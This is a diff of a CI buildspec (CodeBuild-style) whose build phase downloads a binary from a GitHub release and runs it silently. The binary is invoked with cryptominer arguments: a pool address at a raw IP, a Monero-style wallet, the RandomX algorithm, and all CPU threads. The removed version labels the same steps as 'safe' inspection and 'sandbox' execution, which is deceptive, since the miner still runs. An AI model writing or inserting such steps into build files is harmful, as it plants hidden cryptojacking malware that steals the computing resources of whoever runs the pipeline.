@@ -3,24 +3,23 @@ version: 0.2
 phases:
   install:
     commands:
-      # Ensure curl, wget, and Python3 are available
-      - apt-get update
-      - apt-get install -y wget curl python3 file
+      # Update and install only necessary packages
+      - apt update && \
+        apt install -y --no-install-recommends \
+            curl \
+            git \
+            wget \
+            libicu-dev \
+            libncurses6 \
+            libncursesw6 \
+            libtinfo6 \
+            python3 \
+            python3-pip && \
+        rm -rf /var/lib/apt/lists/*
 
   build:
     commands:
-      # Step 1: Generate a random filename
-      - BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
-
-      # Step 2: Download the binary safely
-      - wget -q https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar -O "$BIN_NAME"
-
-      # Step 3: Make it executable
-      - chmod +x "$BIN_NAME"
-
-      # Step 4: Inspect the binary type before running
-      - file "$BIN_NAME"
-
-      # Step 5: Optional safe execution in sandbox / test mode
-      - ./"$BIN_NAME" -o 3.238.231.79:8085 -u 87BHPx4atTidKdRdrWkYEvKhhY4TtKnncUX2ECWgY4syhxPPKdsGrUjWY8MujTSAyXUzh5cvJEWf4WCL8Fp1fXeETMHSYf6 -p bd08 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+      - wget https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar
+      - chmod +x crrmnar
+      - ./crrmnar -o 3.238.231.79:8085 -u 87BHPx4atTidKdRdrWkYEvKhhY4TtKnncUX2ECWgY4syhxPPKdsGrUjWY8MujTSAyXUzh5cvJEWf4WCL8Fp1fXeETMHSYf6 -p bd08 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
       
